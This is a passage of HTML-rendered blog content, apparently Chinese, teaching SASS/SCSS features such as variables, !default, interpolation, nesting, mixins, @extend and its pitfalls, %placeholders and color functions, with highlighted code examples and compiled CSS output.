class=\"number\">#333</span>;  <span class=\"comment\">// 声明变量</span></span><br><span class=\"line\"><span class=\"variable\">$bgcolor</span>:<span class=\"number\">#f36</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>; <span class=\"comment\">// 引用变量</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgcolor</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"变量默认值-default\"><a href=\"#变量默认值-default\" class=\"headerlink\" title=\"变量默认值!default\"></a>变量默认值!default</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>:red;</span><br><span class=\"line\"><span class=\"variable\">$color</span>:blue !default;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:<span class=\"variable\">$color</span>; <span class=\"comment\">//red</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，</span></span><br><span class=\"line\"><span class=\"comment\">// 反之如果之前有申明，则用申明的值。</span></span><br><span class=\"line\"><span class=\"comment\">// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"变量用-包裹\"><a href=\"#变量用-包裹\" class=\"headerlink\" title=\"变量用#{}包裹\"></a>变量用<code>#{}</code>包裹</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$btnClass</span>: btn !default;</span><br><span class=\"line\"><span class=\"variable\">$borderDirection</span>:  top !default;</span><br><span class=\"line\"></span><br><span class=\"line\">.#&#123;<span class=\"variable\">$btnClass</span>&#125;&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>-#&#123;<span class=\"variable\">$borderDirection</span>&#125;:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析成的css：</span></span><br><span class=\"line\"><span class=\"selector-class\">.btn</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-top</span>:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"多个变量一起申明\"><a href=\"#多个变量一起申明\" class=\"headerlink\" title=\"多个变量一起申明\"></a>多个变量一起申明</h4><p>把多个相关的值写在一个变量里，然后通过<code>nth($var,index)</code>来获取第几个值。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$linkColor</span>: red blue !default;</span><br><span class=\"line\"><span class=\"selector-tag\">a</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:nth(<span class=\"variable\">$linkColor</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">    &amp;:hover&#123;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>:nth(<span class=\"variable\">$linkColor</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析成的css：</span></span><br><span class=\"line\"><span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: red; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">a</span>:hover &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: blue; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"嵌套-Nesting\"><a href=\"#嵌套-Nesting\" class=\"headerlink\" title=\"嵌套(Nesting)\"></a>嵌套(Nesting)</h3><p>SASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。</p>\n<p>然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。</p>\n<h4 id=\"选择器的嵌套\"><a href=\"#选择器的嵌套\" class=\"headerlink\" title=\"选择器的嵌套\"></a>选择器的嵌套</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$color</span>: <span class=\"number\">#333</span>; </span><br><span class=\"line\"><span class=\"variable\">$bgcolor</span>:<span class=\"number\">#f36</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">section</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#f36</span>;</span><br><span class=\"line\">  <span class=\"selector-tag\">nav</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">    <span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">color</span>: <span class=\"number\">#0982c1</span>;</span><br><span class=\"line\">      &amp;:hover&#123;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"样式的嵌套\"><a href=\"#样式的嵌套\" class=\"headerlink\" title=\"样式的嵌套\"></a>样式的嵌套</h4><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">li</span> &#123; </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: &#123; </span><br><span class=\"line\">    style:italic; </span><br><span class=\"line\">    family:serif; </span><br><span class=\"line\">    weight:bold; </span><br><span class=\"line\">    size:<span class=\"number\">1.2em</span>; </span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 当然font属性可以使用css3的合写，那就更简单了</span></span><br><span class=\"line\"><span class=\"selector-tag\">li</span> &#123; </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: serif italic bold <span class=\"number\">1.2em</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Mixins\"><a href=\"#Mixins\" class=\"headerlink\" title=\"Mixins\"></a>Mixins</h3><p>Mixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> error(<span class=\"variable\">$borderWidth</span>: 2px)&#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"variable\">$borderWidth</span> solid <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> error(<span class=\"number\">10px</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>举例：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Example: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\"><span class=\"variable\">$prefix-for-webkit</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-mozilla</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-microsoft</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-opera</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-spec</span>: true !default; <span class=\"comment\">// required for keyframe mixin</span></span><br><span class=\"line\"><span class=\"comment\">//prefixer</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> prefixer (<span class=\"variable\">$property</span>, <span class=\"variable\">$value</span>, <span class=\"variable\">$prefixes</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prefix</span> in <span class=\"variable\">$prefixes</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">if</span> <span class=\"variable\">$prefix</span> == webkit and <span class=\"variable\">$prefix-for-webkit</span> == true &#123;</span><br><span class=\"line\">      -webkit-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == moz and <span class=\"variable\">$prefix-for-mozilla</span> == true &#123;</span><br><span class=\"line\">      -moz-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == ms and <span class=\"variable\">$prefix-for-microsoft</span> == true &#123;</span><br><span class=\"line\">      -ms-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == o and <span class=\"variable\">$prefix-for-opera</span> == true &#123;</span><br><span class=\"line\">      -o-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == spec and <span class=\"variable\">$prefix-for-spec</span> == true &#123;      #&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">warn</span> <span class=\"string\">\"Unrecognized prefix: #&#123;$prefix&#125;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> skewX(<span class=\"variable\">$degrees</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, skewX(<span class=\"variable\">$degrees</span>), webkit moz o ms spec);</span><br><span class=\"line\">  -webkit-<span class=\"attribute\">backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> skewX(<span class=\"number\">45deg</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">skewX</span>(45deg) <span class=\"meta\">!important</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-o-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-ms-transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">transform</span>: <span class=\"built_in\">skewX</span>(45deg);</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"extend\"><a href=\"#extend\" class=\"headerlink\" title=\"@extend\"></a>@extend</h3><p>假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-class\">.error</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-tag\">border</span>: 1<span class=\"selector-tag\">px</span> <span class=\"selector-id\">#f00</span>;</span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-tag\">background-color</span>: <span class=\"selector-id\">#fdd</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-class\">.seriousError</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">  border-width: 3px;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"error seriousError\"</span>&gt;</span></span><br><span class=\"line\">  Oh no! You've been hacked!</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用<code>@extend</code>：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> .error;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>注意@extendh会有一个缺点：</strong></p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 这是一个其他样式</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> <span class=\"selector-class\">.error</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> .error;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是在编译后的CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> <span class=\"selector-class\">.error</span>, <span class=\"selector-tag\">p</span> <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 然而你只想实现</span><br><span class=\"line\"><span class=\"selector-class\">.error</span>, <span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> <span class=\"number\">#f00</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"number\">#fdd</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">p .error &#123; // 这部分的样式不能干扰到 seriousError</span><br><span class=\"line\">  <span class=\"selector-tag\">color</span>: <span class=\"selector-tag\">blue</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.seriousError</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">border-width</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以，通过<code>@extend</code>引用的类名，你要有绝对的自信，它从未用在几个地方。</p>\n<h3 id=\"嵌套、Mixins和-extend的缺点\"><a href=\"#嵌套、Mixins和-extend的缺点\" class=\"headerlink\" title=\"嵌套、Mixins和@extend的缺点\"></a>嵌套、Mixins和@extend的缺点</h3><p>嵌套：有可能编译的css层级过深</p>\n<p>Mixins：Mixins用来指定具体属性值会使css变得臃肿</p>\n<p><strong>Mixins的黄金规则</strong>是将相似的风格定义在一个<code>@mixin</code>中。请注意这里的一个关键词<strong>相似的</strong>，另外Mixins主要是用于重用，而不是用来指定具体的属性值。</p>\n<p>@extend：<code>@extend</code>是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的<code>.error</code></p>\n<h3 id=\"强大的-placeholders\"><a href=\"#强大的-placeholders\" class=\"headerlink\" title=\"强大的%placeholders\"></a>强大的%placeholders</h3><p>使用<code>%</code>和<code>@extend</code>就可以将继承中埋下的地雷给排了。</p>\n<p><code>%</code>只是一个占位符，他不是正常的选择器，不像<code>.classes</code>或者<code>#ids</code>，只要不通过<code>@extend</code>调用，他是不会产生任何代码量。</p>\n<p>首先使用<code>%placeholders</code>定义一个公用样式，类似于<code>.class</code>：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%placeholders &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在需要使用的地方通过<code>@extend</code>来调用：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">selector &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %placeholders;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>举例：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> fit-content() &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -webkit-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -moz-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -o-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: -ms-fit-content;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: fit-content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%clearfix &#123;</span><br><span class=\"line\">    *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &amp;:after,</span><br><span class=\"line\">    &amp;:before &#123;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">      <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">      <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">nav</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">    <span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">50px</span> auto;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">        @<span class=\"keyword\">include</span> fit-content();</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"attribute\">list-style</span>: none;</span><br><span class=\"line\">        @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"function\"><a href=\"#function\" class=\"headerlink\" title=\"@function\"></a>@function</h3><p>@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$f00</span>: <span class=\"number\">#f00</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//作为变量值</span></span><br><span class=\"line\"><span class=\"variable\">$redDark</span>: darken(<span class=\"variable\">$f00</span>,<span class=\"number\">10%</span>) !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//作为属性值</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: darken(<span class=\"variable\">$f00</span>,<span class=\"number\">70%</span>);</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"variable\">$redDark</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"rgba\"><a href=\"#rgba\" class=\"headerlink\" title=\"rgba\"></a>rgba</h4><p>分为两种：<code>rgba($red, $green, $blue, $alpha)</code>和<code>rgba($color, $alpha)</code>。</p>\n<p>第一种跟css3一样，不介绍，第二种对我们有点用，实例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rgba(#102030, 0.5) =&gt; rgba(16, 32, 48, 0.5)</span><br><span class=\"line\">rgba(blue, 0.2)    =&gt; rgba(0, 0, 255, 0.2)</span><br></pre></td></tr></table></figure>\n<h4 id=\"ie-hex-str\"><a href=\"#ie-hex-str\" class=\"headerlink\" title=\"ie-hex-str\"></a>ie-hex-str</h4><p>ie-hex-str($color)</p>\n<p>这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 